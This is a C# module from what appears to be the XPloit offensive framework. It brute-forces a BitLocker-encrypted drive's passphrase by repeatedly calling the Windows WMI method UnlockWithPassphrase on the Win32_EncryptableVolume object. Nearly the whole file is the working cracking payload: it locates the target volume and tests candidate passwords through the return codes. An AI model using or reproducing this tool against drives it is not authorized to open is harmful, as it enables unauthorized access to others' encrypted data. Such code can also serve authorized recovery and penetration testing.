using System;
using System.Management;
using XPloit.Core;
using XPloit.Core.Enums;

namespace XPloit.Modules.Auxiliary.Local
{
    public class BruteForceBitLockerWMI : Payload, BruteForce.ICheckPassword
    {
        #region Configure
        public override string Author { get { return "Fernando Díaz Toledano"; } }
        public override string Description { get { return "Crack Bitlocker drive calling windows API"; } }
        public override string Path { get { return "Payloads/Local/BruteForce"; } }
        public override string Name { get { return "BruteForceBitLockerWMI"; } }
        public override Reference[] References
        {
            get
            {
                return new Reference[] { new Reference(EReferenceType.URL, "https://technet.microsoft.com/es-es/dd401683(v=vs.71).aspx") };
            }
        }
        #endregion

        #region Properties
        public string Drive { get; set; }
        #endregion

        enum EUnlockRet : uint
        {
            /// <summary>
            /// The method was successful.
            /// </summary>
            S_OK = 0,
            /// <summary>
            /// BitLocker is not enabled on the volume. Add a key protector to enable BitLocker.
            /// </summary>
            FVE_E_NOT_ACTIVATED = 2150694920,
            /// <summary>
            /// The group policy setting that requires FIPS compliance prevented the passphrase from being generated or used.
            /// </summary>
            FVE_E_FIPS_PREVENTS_PASSPHRASE = 2150695020,
            /// <summary>
            /// The passphrase provided does not meet the minimum or maximum length requirements.
            /// </summary>
            FVE_E_POLICY_INVALID_PASSPHRASE_LENGTH = 2150695040,
            /// <summary>
            /// The passphrase does not meet the complexity requirements set by the administrator in group policy.
            /// </summary>
            FVE_E_POLICY_PASSPHRASE_TOO_SIMPLE = 2150695041,
            /// <summary>
            /// The volume cannot be unlocked with the provided information.
            /// </summary>
            FVE_E_FAILED_AUTHENTICATION = 2150694951,
            /// <summary>
            /// The provided key protector does not exist on the volume. You must enter another key protector.
            /// </summary>
            FVE_E_PROTECTOR_NOT_FOUND = 2150694963
        }

        public bool AllowMultipleOk { get { return false; } }
        public bool CheckPassword(string password)
        {
            EUnlockRet ret = (EUnlockRet)(uint)_Item.InvokeMethod("UnlockWithPassphrase", new object[] { password });
            switch (ret)
            {
                case EUnlockRet.FVE_E_FAILED_AUTHENTICATION:
                case EUnlockRet.FVE_E_FIPS_PREVENTS_PASSPHRASE:
                case EUnlockRet.FVE_E_NOT_ACTIVATED:
                case EUnlockRet.FVE_E_POLICY_INVALID_PASSPHRASE_LENGTH:
                case EUnlockRet.FVE_E_POLICY_PASSPHRASE_TOO_SIMPLE:
                case EUnlockRet.FVE_E_PROTECTOR_NOT_FOUND: return false;
                case EUnlockRet.S_OK: return true;
            }
            return false;
        }

        ManagementObject _Item = null;
        public bool PreRun()
        {
            ManagementPath path = new ManagementPath(@"\ROOT\CIMV2\Security\MicrosoftVolumeEncryption") { ClassName = "Win32_EncryptableVolume" };
            ManagementScope scope = new ManagementScope(path);
            ManagementClass objectSearcher = new ManagementClass(scope, path, new ObjectGetOptions());
            foreach (ManagementObject item in objectSearcher.GetInstances())
            {
                try
                {
                    string dr = item["DriveLetter"].ToString().ToUpper().TrimEnd(':');
                    if (dr != Drive.ToUpper().TrimEnd(':')) continue;
                    _Item = item;
                }
                catch { }
            }

            if (_Item == null)
            {
                throw (new Exception("Drive not found"));
            }
            return true;
        }
        public void PostRun() { if (_Item != null) _Item.Dispose(); }
    }
}